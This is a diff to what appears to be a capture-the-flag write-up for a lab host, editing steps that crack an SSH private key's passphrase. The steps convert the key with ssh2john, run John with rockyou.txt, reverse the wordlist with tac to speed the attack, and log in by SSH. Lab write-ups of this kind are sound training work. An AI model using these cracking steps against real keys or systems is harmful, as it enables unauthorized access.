@@ -88,7 +88,7 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added 'contain-linux.thm' (ECDSA) to the list of known hosts.
 Enter passphrase for key 'contain-linux.key':
 </pre>
-The usage of the private OpenSSH key prompt for a passphrase. Convert the private OpenSSH key to a John-compatible hash.
+The usage of the private OpenSSH key prompts for a passphrase. Convert the private OpenSSH key to a John-compatible hash.
 
 `/opt/john/ssh2john.py contain-linux.key > contain-linux.hash` (Attacker Machine)
 
@@ -96,7 +96,12 @@ Run a wordlist attack with John and `rockyou.txt`.
 
 `john --wordlist=/usr/share/wordlists/rockyou.txt contain-linux.hash` (Attacker Machine)
 
-It takes a long time until John outputs the correct passphrase. Accessing `contain-linux.thm` through the recent ssh command and the descried passphrase succeeds.
+Since this command would obviously take a long time to finish, reverse the lines in `rockyou.txt` and launch a second wordlist attack.
+
+`tac /usr/share/wordlists/rockyou.txt > /tmp/rockyou.txt` (Attacker Machine)
+`john --wordlist=/tmp/rockyou.txt contain-linux.hash` (Attacker Machine)
+
+The second attack briskly outputs the correct passphrase. Accessing `contain-linux.thm` through the recent ssh command and the descried passphrase succeeds.
 
 `ssh -i contain-linux.key <redacted>@contain-linux.thm` (Attacker Machine)
 # `user.txt`
